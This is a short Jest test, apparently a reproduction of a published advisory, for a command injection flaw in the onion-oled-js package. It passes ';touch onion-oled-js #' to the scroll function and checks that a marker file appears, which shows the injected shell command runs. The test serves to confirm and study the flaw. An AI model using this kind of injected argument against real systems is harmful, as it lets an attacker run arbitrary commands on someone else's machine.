//https://snyk.io/vuln/SNYK-JS-ONIONOLEDJS-1078808
test("Command Injection in onion-oled-js", () => 
{
    const OLEDExp = require('onion-oled-js').OLEDExp;
	const fs = require('fs')
	const path = './onion-oled-js'
	const sleep = require('sleep');
	
	let file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
	
    OLEDExp.scroll(';touch onion-oled-js #');

	sleep.sleep(5);
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});